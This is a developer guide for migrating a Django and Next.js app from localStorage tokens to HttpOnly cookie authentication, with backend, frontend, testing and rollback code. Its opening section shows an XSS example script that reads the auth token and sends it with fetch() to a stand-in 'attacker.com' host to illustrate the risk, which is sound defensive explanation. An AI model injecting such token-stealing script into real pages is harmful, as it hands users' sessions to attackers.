# Authentication Migration Guide
## From localStorage to HttpOnly Cookies

This guide explains how to migrate from localStorage-based authentication (vulnerable to XSS) to HttpOnly cookie-based authentication (secure).

---

## Why This Change is Critical 🔒

**Current Vulnerability:**
```typescript
// ❌ VULNERABLE: Any malicious script can steal this
localStorage.setItem('auth_token', token)
const token = localStorage.getItem('auth_token')
```

**What an attacker can do:**
```javascript
// Malicious script injected via XSS
const stolenToken = localStorage.getItem('auth_token')
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token: stolenToken })
})
```

**Secure Approach:**
```typescript
// ✅ SECURE: Token in HttpOnly cookie, inaccessible to JavaScript
// Cookie is automatically included in requests
// JavaScript cannot read it, even if XSS occurs
```

---

## Migration Steps

### Phase 1: Backend Changes (Django)

#### 1. Update Login View

**File:** `views/auth.py` (or wherever your login is)

```python
from django.http import JsonResponse
from django.views.decorators.csrf import ensure_csrf_cookie
from datetime import timedelta
from django.utils import timezone

@ensure_csrf_cookie
def login(request):
    # ... your existing authentication logic ...

    # After successful authentication:
    response = JsonResponse({
        'user': {
            'id': user.id,
            'email': user.email,
            'name': user.get_full_name(),
            'role': user.role,
            # ... other non-sensitive user data
        },
        'success': True
    })

    # Set the token in an HttpOnly cookie
    response.set_cookie(
        key='auth_token',
        value=token,  # Your JWT or session token
        max_age=3600,  # 1 hour in seconds
        httponly=True,  # Cannot be accessed by JavaScript
        secure=True,    # Only sent over HTTPS (disable in local dev)
        samesite='Lax', # CSRF protection
        path='/',       # Available site-wide
    )

    return response
```

#### 2. Update Logout View

```python
def logout(request):
    response = JsonResponse({'success': True})

    # Clear the auth token cookie
    response.delete_cookie('auth_token')

    return response
```

#### 3. Update Authentication Middleware

```python
# middleware/auth.py
from django.http import JsonResponse

class CookieAuthenticationMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        # Get token from cookie instead of Authorization header
        token = request.COOKIES.get('auth_token')

        if token:
            try:
                # Validate and decode token
                user = validate_token(token)  # Your token validation logic
                request.user = user
            except Exception:
                pass

        response = self.get_response(request)
        return response
```

#### 4. Update CORS Settings

```python
# settings.py

CORS_ALLOW_CREDENTIALS = True  # Required for cookies

CORS_ALLOWED_ORIGINS = [
    "http://localhost:3000",  # Development
    "https://your-production-domain.com",  # Production
]

# If using django-cors-headers
CORS_ALLOW_HEADERS = [
    'accept',
    'accept-encoding',
    'authorization',
    'content-type',
    'dnt',
    'origin',
    'user-agent',
    'x-csrftoken',
    'x-requested-with',
]
```

#### 5. Update CSRF Settings

```python
# settings.py

CSRF_COOKIE_HTTPONLY = False  # Frontend needs to read CSRF token
CSRF_COOKIE_SAMESITE = 'Lax'
CSRF_COOKIE_SECURE = True  # Only over HTTPS in production

# For local development, you might need:
CSRF_TRUSTED_ORIGINS = [
    'http://localhost:3000',
    'https://your-production-domain.com'
]
```

---

### Phase 2: Frontend Changes

#### 1. Update API Client

**File:** `src/lib/api.ts` (or your main API client)

```typescript
import axios from 'axios'

const api = axios.create({
  baseURL: process.env.NEXT_PUBLIC_API_URL,
  withCredentials: true,  // ✅ Include cookies in requests
  headers: {
    'Content-Type': 'application/json',
  },
})

// ❌ REMOVE THIS: Manual token setting
// api.interceptors.request.use((config) => {
//   const token = localStorage.getItem('auth_token')
//   if (token) {
//     config.headers.Authorization = `Bearer ${token}`
//   }
//   return config
// })

// ✅ ADD THIS: Handle CSRF token
api.interceptors.request.use((config) => {
  // Get CSRF token from cookie (for POST/PUT/DELETE requests)
  const csrfToken = document.cookie
    .split('; ')
    .find(row => row.startsWith('csrftoken='))
    ?.split('=')[1]

  if (csrfToken && ['post', 'put', 'patch', 'delete'].includes(config.method?.toLowerCase() || '')) {
    config.headers['X-CSRFToken'] = csrfToken
  }

  return config
})

// Handle 401 errors (redirect to login)
api.interceptors.response.use(
  (response) => response,
  (error) => {
    if (error.response?.status === 401) {
      // Token expired or invalid
      window.location.href = '/auth/login'
    }
    return Promise.reject(error)
  }
)

export default api
```

#### 2. Update Auth Store

**File:** `src/store/authStore.ts`

```typescript
import { create } from 'zustand'
import api from '@/lib/api-client'
import { User, LoginForm } from '@/types'

interface AuthState {
  user: User | null
  isAuthenticated: boolean
  isLoading: boolean
  error: string | null

  login: (credentials: LoginForm) => Promise<void>
  logout: () => Promise<void>
  checkAuth: () => Promise<void>
  clearError: () => void
}

export const useAuthStore = create<AuthState>()((set) => ({
  user: null,
  isAuthenticated: false,
  isLoading: false,
  error: null,

  login: async (credentials: LoginForm) => {
    set({ isLoading: true, error: null })
    try {
      // Token will be set in cookie by backend
      const response = await api.login(credentials)

      set({
        user: response.user,
        isAuthenticated: true,
        isLoading: false,
        error: null,
      })
    } catch (error: any) {
      set({
        user: null,
        isAuthenticated: false,
        isLoading: false,
        error: error?.message || 'Login failed',
      })
      throw error
    }
  },

  logout: async () => {
    set({ isLoading: true })
    try {
      // Backend will clear the cookie
      await api.logout()

      set({
        user: null,
        isAuthenticated: false,
        isLoading: false,
        error: null,
      })
    } catch (error) {
      console.error('Logout error:', error)
      // Clear state anyway
      set({
        user: null,
        isAuthenticated: false,
        isLoading: false,
        error: null,
      })
    }
  },

  checkAuth: async () => {
    set({ isLoading: true })
    try {
      // Call backend to verify cookie token
      const response = await api.getCurrentUser()

      set({
        user: response.user,
        isAuthenticated: true,
        isLoading: false,
      })
    } catch (error) {
      set({
        user: null,
        isAuthenticated: false,
        isLoading: false,
      })
    }
  },

  clearError: () => set({ error: null }),
}))
```

#### 3. Update Middleware

**File:** `src/middleware.ts`

```typescript
import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'

const PUBLIC_ROUTES = [
  '/auth/login',
  '/auth/register',
  '/auth/forgot-password',
  '/landing',
  '/home',
  '/about',
]

export async function middleware(request: NextRequest) {
  const { pathname } = request.nextUrl

  const isPublicRoute = PUBLIC_ROUTES.some(route => pathname.startsWith(route))
  const token = request.cookies.get('auth_token')

  // Optional: Validate token with backend
  // if (token) {
  //   try {
  //     const response = await fetch(`${process.env.NEXT_PUBLIC_API_URL}/auth/verify`, {
  //       headers: { Cookie: `auth_token=${token.value}` }
  //     })
  //     if (!response.ok) {
  //       // Token invalid, clear it
  //       const response = NextResponse.redirect(new URL('/auth/login', request.url))
  //       response.cookies.delete('auth_token')
  //       return response
  //     }
  //   } catch (error) {
  //     // Network error, allow request to proceed
  //   }
  // }

  if (!isPublicRoute && !token) {
    const loginUrl = new URL('/auth/login', request.url)
    loginUrl.searchParams.set('redirect', pathname)
    return NextResponse.redirect(loginUrl)
  }

  return NextResponse.next()
}
```

#### 4. Clean Up Old localStorage Code

Search and remove all instances of:

```bash
# Find all localStorage usage
grep -r "localStorage.setItem('auth_token'" src/
grep -r "localStorage.getItem('auth_token'" src/
grep -r "localStorage.removeItem('auth_token'" src/
grep -r "localStorage.setItem('auth_user'" src/
```

**Files likely needing updates:**
- `src/store/authStore.ts`
- `src/lib/api.ts`
- `src/lib/apiClient.ts`
- `src/app/auth/login/page.tsx`
- Any component checking authentication

---

### Phase 3: Testing

#### Local Development Testing

1. **Update your `.env.local`:**
```env
NEXT_PUBLIC_API_URL=http://localhost:8000/api
NODE_ENV=development
```

2. **Django Development Settings:**
```python
# settings.py - Development only
CSRF_COOKIE_SECURE = False  # Allow over HTTP
SESSION_COOKIE_SECURE = False
```

3. **Test Authentication Flow:**
```bash
# Start backend
python manage.py runserver

# Start frontend
npm run dev

# Test in browser:
# 1. Open DevTools → Application → Cookies
# 2. Login → Verify auth_token cookie appears
# 3. Check cookie flags: HttpOnly ✓, Secure (in production)
# 4. Logout → Verify cookie is removed
# 5. Try accessing protected route without cookie → Should redirect
```

#### Production Testing Checklist

- [ ] HTTPS is enabled
- [ ] Cookies have `Secure` flag enabled
- [ ] Cookies have `HttpOnly` flag enabled
- [ ] Cookies have `SameSite=Lax` or `SameSite=Strict`
- [ ] CORS is configured correctly
- [ ] CSRF protection is working
- [ ] Token expiration is reasonable (1-2 hours)
- [ ] Refresh token mechanism (if applicable)
- [ ] Old localStorage tokens are cleared on first login

---

## Rollback Plan

If issues occur in production:

1. **Quick Rollback:**
   - Revert frontend to previous commit
   - Keep backend changes (they're backward compatible if done right)
   - localStorage-based auth will still work

2. **Backend Backward Compatibility:**
```python
def login(request):
    # ... authenticate ...

    response = JsonResponse({
        'token': token,  # Keep for backward compatibility
        'user': user_data
    })

    # Also set cookie for new clients
    response.set_cookie('auth_token', token, httponly=True, secure=True)

    return response
```

---

## Common Issues and Solutions

### Issue 1: CORS Errors

**Error:** `CORS policy: Credentials flag is 'true', but the 'Access-Control-Allow-Credentials' header is ''`

**Solution:**
```python
# Django settings.py
CORS_ALLOW_CREDENTIALS = True
```

### Issue 2: Cookies Not Being Set

**Possible Causes:**
1. Backend and frontend on different domains
2. `Secure` flag on without HTTPS
3. `SameSite` too restrictive

**Solution:**
```python
# For local development
response.set_cookie(
    'auth_token',
    token,
    httponly=True,
    secure=False,  # Allow HTTP in development
    samesite='Lax',
)
```

### Issue 3: CSRF Token Issues

**Error:** `CSRF token missing or incorrect`

**Solution:**
```typescript
// Frontend: Ensure CSRF token is sent
const csrfToken = document.cookie
  .split('; ')
  .find(row => row.startsWith('csrftoken='))
  ?.split('=')[1]

// Add to request headers
headers['X-CSRFToken'] = csrfToken
```

### Issue 4: Mobile App Considerations

If you have a mobile app, cookies work differently:

**Option 1:** Use tokens for mobile, cookies for web
**Option 2:** Implement OAuth2 with refresh tokens
**Option 3:** Use secure storage in mobile app

---

## Timeline Estimate

- **Backend Changes:** 1-2 days
- **Frontend Changes:** 2-3 days
- **Testing:** 2-3 days
- **Production Deployment:** 1 day
- **Monitoring:** 1 week

**Total:** ~2 weeks including testing and monitoring

---

## Additional Security Considerations

After implementing cookie-based auth:

1. **Implement Refresh Tokens:**
   - Short-lived access tokens (15 minutes)
   - Longer-lived refresh tokens (7 days)

2. **Add Rate Limiting:**
```python
# Django
from django.core.cache import cache

def rate_limit(request):
    ip = request.META.get('REMOTE_ADDR')
    cache_key = f'rate_limit_{ip}'
    attempts = cache.get(cache_key, 0)

    if attempts >= 5:
        return JsonResponse({'error': 'Too many attempts'}, status=429)

    cache.set(cache_key, attempts + 1, 300)  # 5 minutes
```

3. **Monitor for Security Issues:**
   - Failed login attempts
   - Token validation failures
   - Unusual access patterns

---

## Support

If you need help with this migration:
1. Check Django logs for backend errors
2. Check browser console for frontend errors
3. Use browser DevTools → Network tab to inspect requests
4. Review cookies in Application tab

Good luck with the migration! 🔐
